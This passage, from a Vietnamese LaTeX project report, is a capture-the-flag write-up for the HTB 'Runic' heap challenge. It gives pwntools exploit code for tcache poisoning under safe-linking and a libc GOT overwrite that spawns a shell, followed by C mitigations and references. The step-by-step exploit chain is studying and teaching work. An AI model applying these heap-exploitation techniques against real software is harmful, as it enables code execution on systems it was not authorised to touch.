\begin{lstlisting}[language=Python]
strlen_got = (libc.address + 0x1f2098 - 0x8) ^ (heap_base >> 12)
\end{lstlisting}

Vì các chunk hợp lệ phải được cấp phát tại địa chỉ được căn chỉnh 16 byte (chia hết cho 16), nên cần trừ con trỏ đi \texttt{0x8}, và việc encode cũng cần phải thực hiện do yêu cầu của phiên bản GLIBC. Việc ghi nội dung vào offset +8 bytes của content cũng phù hợp với việc căn chỉnh này.

Tiếp theo, free 2 lần vào tcache bin: một chunk bất kỳ vào trước, chunk 18 vào sau.

\begin{lstlisting}[language=Python]
delete(b'\x15')
delete(b'\x18')
\end{lstlisting}

Tcache hiện trông như sau:

\begin{figure}[H]
    \centering
    \includegraphics[width=\textwidth]{images/image-25.png}
    \caption{Trạng thái tcache bin trước khi ghi đè}
\end{figure}

Chúng ta ghi đè con trỏ \texttt{fd}:

\begin{lstlisting}[language=Python]
edit(b'\x17', b'\x19\x00\x01', b'A' * 16 + p64(0x71) + p64(strlen_got))
\end{lstlisting}

\begin{figure}[H]
    \centering
    \includegraphics[width=\textwidth]{images/image-26.png}
    \caption{Ghi đè con trỏ \texttt{fd} đến \texttt{strlen()} GOT entry}
\end{figure}

Cấp phát 2 lần để ghi đè thành địa chỉ system:

\begin{lstlisting}[language=Python]
create(b'\x18', 0x60, b'/bin/sh\0')
create(b'\x15', 0x60, p64(libc.symbols['system']))
\end{lstlisting}

Tuy nhiên, chương trình crash ngay lập tức do lỗi SIGSEGV - truy cập bộ nhớ không hợp lệ:

\begin{figure}[H]
    \centering
    \includegraphics[width=\textwidth]{images/image-27.png}
    \caption{Chương trình bị crash với lỗi SIGSEGV}
\end{figure}

Kiểm tra các GOT entry sau khi cấp phát và thấy entry của \texttt{strlen()} bị ghi thành NULL:

\begin{figure}[H]
    \centering
    \includegraphics[width=\textwidth]{images/image-28.png}
    \caption{GOT entry của \texttt{strlen()} bị ghi đè thành NULL}
\end{figure}

Theo như công cụ Perplexity, trên phiên bản GLIBC 2.34, chunk được lấy từ tcache bin khi cấp phát sẽ bị ptmalloc ghi đè 8 byte sau thành NULL, còn 8 byte đầu thì không bị ghi đè. Vì vậy, GOT entry ở trên \texttt{strncmp()} được ghi thành \texttt{\textbackslash x15\textbackslash x00} còn GOT entry của \texttt{strlen()} bị ghi thành NULL.

\begin{figure}[H]
    \centering
    \includegraphics[width=\textwidth]{images/image-29.png}
    \caption{Hành vi của ptmalloc khi cấp phát từ tcache bin}
\end{figure}

Nhìn lại trong hàm \texttt{create()}, thấy \texttt{puts("Rune contents: ");} được gọi sau \texttt{malloc()} nhưng trước \texttt{read()}. Vậy \texttt{puts()} đã cố gắng truy cập hàm tại địa chỉ NULL để gọi \texttt{strlen()}, trước khi có thể ghi đè, dẫn đến lỗi SIGSEGV và crash chương trình.

\begin{lstlisting}[language=C]
content = (char *)malloc(length + 8);
strcpy(MainTable[index]->name, name);
MainTable[index]->content = content;
MainTable[index]->length = length;
strcpy(content, name);
puts("Rune contents: ");
read(0, content + 8, length);
\end{lstlisting}

Giải pháp là dịch con trỏ \texttt{fd} giả mạo đến địa chỉ thấp hơn để tránh ptmalloc ghi NULL vào GOT entry của \texttt{strlen()}, cụ thể dịch \texttt{0x10} byte về địa chỉ thấp hơn:

\begin{lstlisting}[language=Python]
strlen_got = (libc.address + 0x1f2098 - 0x8 - 0x10) ^ (heap_base >> 12)

delete(b'\x15')
delete(b'\x18')

edit(b'\x17', b'\x19\x00\x01', b'A' * 16 + p64(0x71) + p64(strlen_got))

create(b'\x18', 0x60, b'/bin/sh\0')
create(b'\x15', 0x60, b'A' * 16 + p64(libc.symbols['system']))
\end{lstlisting}

Địa chỉ của hàm \texttt{system()} đã được ghi đè thành công vào GOT entry của \texttt{strlen()}:

\begin{figure}[H]
    \centering
    \includegraphics[width=\textwidth]{images/image-30.png}
    \caption{Ghi đè thành công GOT entry của \texttt{strlen()} với địa chỉ \texttt{system()}}
\end{figure}

Việc cuối cùng cần làm là gọi \texttt{show('\textbackslash x18')} để gọi \texttt{system('/bin/sh')}. Tuy nhiên, vì đã corrupt hàm \texttt{puts()}, mọi thứ in ra từ bây giờ sẽ là toàn các giá trị rác. Do đó, có thể sử dụng \texttt{recvrepeat()} để bỏ qua dữ liệu nhận được:

\begin{lstlisting}[language=Python]
print("Spawning the shell:")

sl(p, b'4')
rr(p, 1)
s(p, b'\x18')
rr(p, 1)

ia(p)
\end{lstlisting}

Mã khai thác đã thành công mở shell và chiếm quyền điều khiển máy nạn nhân.

\begin{figure}[H]
    \centering
    \includegraphics[width=\textwidth]{images/image-31.png}
    \caption{Thành công mở shell và chiếm quyền điều khiển}
\end{figure}

\clearpage
\section{Mitigations}

Lỗ hổng trong chương trình Runic bắt nguồn từ việc sử dụng \texttt{strcpy()} kết hợp với \texttt{read()} để xử lý input chứa NULL bytes, dẫn đến hash confusion và heap buffer overflow. Để ngăn chặn lỗ hổng này, có thể áp dụng các biện pháp phòng thủ sau:

\subsection{Sử dụng \texttt{memcpy()} thay vì \texttt{strcpy()}}

Nếu chương trình cần xử lý dữ liệu binary có thể chứa NULL bytes ở giữa chuỗi (khi sử dụng \texttt{read()} để nhập tên), nên thay thế \texttt{strcpy()} bằng \texttt{memcpy()}:

\begin{lstlisting}[language=C]
// Thay vi:
char new_name[8];
read(0, new_name, 8);
strcpy(content, new_name);  // Nguy hiem: dung lai khi gap NULL

// Nen su dung:
char new_name[8];
ssize_t bytes_read = read(0, new_name, 8);
if (bytes_read > 0) {
    memcpy(content, new_name, bytes_read);  // Copy dung bytes_read bytes
    content[bytes_read] = '\0';             // Them NULL terminator
}
\end{lstlisting}

\texttt{memcpy()} sao chép chính xác số bytes được chỉ định mà không phụ thuộc vào NULL terminator, đảm bảo toàn bộ dữ liệu được copy đầy đủ. Tuy nhiên, cần đảm bảo kiểm tra giá trị trả về của \texttt{read()} để xác định số bytes thực sự đã đọc, validate tham số đích và nguồn của \texttt{memcpy()} để tránh buffer overflow, và đảm bảo buffer đích đủ lớn để chứa dữ liệu nguồn cộng với NULL terminator.

\subsection{Stop at NULL Byte}

Nếu chương trình muốn người dùng nhập chuỗi liền mạch không chứa NULL bytes ở giữa, nên triển khai cơ chế đọc input từng byte một và kiểm tra ngay lập tức:

\begin{lstlisting}[language=C]
char new_name[9];  // +1 cho NULL terminator
int i = 0;

// Doc tung byte mot, dung lai neu gap NULL
for (i = 0; i < 8; i++) {
    ssize_t result = read(0, &new_name[i], 1);
    if (result <= 0) {
        // Loi hoac EOF
        break;
    }
    if (new_name[i] == '\0') {
        // Gap NULL byte, dung lai
        break;
    }
}
new_name[i] = '\0';  // Them NULL terminator vao cuoi

// Bay gio su dung strcpy() se an toan hon
strcpy(content, new_name);
\end{lstlisting}

Cách tiếp cận này đọc từng byte một trong vòng lặp, kiểm tra ngay nếu gặp NULL byte thì dừng nhập, sau đó thêm NULL terminator vào cuối chuỗi. Điều này đảm bảo chuỗi luôn là NULL-terminated string hợp lệ không chứa NULL bytes ở giữa, loại bỏ hoàn toàn nguy cơ hash confusion khi sử dụng với \texttt{strcpy()}.

\clearpage
\section{Conclusion}

Đồ án này đã trình bày quá trình phân tích và khai thác thành công thử thách Runic từ HTB Cyber Apocalypse CTF 2023, minh họa một chuỗi tấn công hoàn chỉnh nhằm bypass các cơ chế bảo vệ hiện đại của GLIBC 2.34. Lỗ hổng cốt lõi nằm ở việc kết hợp không an toàn giữa \texttt{read()} và \texttt{strcpy()} trong hàm \texttt{edit()}, dẫn đến hash confusion và heap buffer overflow khi xử lý input chứa NULL bytes.

Thông qua kỹ thuật heap exploitation tinh vi bao gồm tcache poisoning, unsorted bin manipulation, và GOT overwrite trong libc, kẻ tấn công có thể đạt được Remote Code Execution mặc dù chương trình được bảo vệ bởi ASLR, NX, PIE và Full RELRO. Quá trình khai thác đòi hỏi hiểu biết về cấu trúc, cơ chế hoạt động của heap được ptmalloc triển khai, cũng như cơ chế bảo vệ Safe-Linking, và khả năng xây dựng primitives như Arbitrary Address Read/Write.

Đồ án nhấn mạnh tầm quan trọng của việc xử lý input một cách an toàn, đặc biệt khi làm việc với dữ liệu binary có thể chứa NULL bytes. Các biện pháp phòng thủ được đề xuất như sử dụng \texttt{memcpy()} hoặc validate input nghiêm ngặt có thể ngăn chặn hoàn toàn lỗ hổng này.

\clearpage
\section{References}

\begin{enumerate}
\item chovid99, ``Cyber Apocalypse 2023 - Pwn: Runic,'' 2023. [Online].\\Available: \href{https://chovid99.github.io/posts/cyber-apocalypse-2023-pwn/\#runic}{https://chovid99.github.io/posts/cyber-apocalypse-2023-pwn/}

\item Enryuzz, ``HTB Cyber Apocalypse CTF 2023 - PWN: Runic Archive,'' GitHub, 2023. [Online].\\Available: \href{https://github.com/Enryuzz/CTF/tree/70b3f5ea05847c3757a3ed1f5601bd854d414f6e/2023/HTB_Cyber_Apocalypse_CTF/PWN/Runic}{GitHub Repository}

\item HackTricks, ``Libc Heap - Binary Exploitation,'' HackTricks Wiki. [Online].\\Available: \href{https://book.hacktricks.wiki/en/binary-exploitation/libc-heap/index.html}{HackTricks Wiki}
\end{enumerate}

\end{document}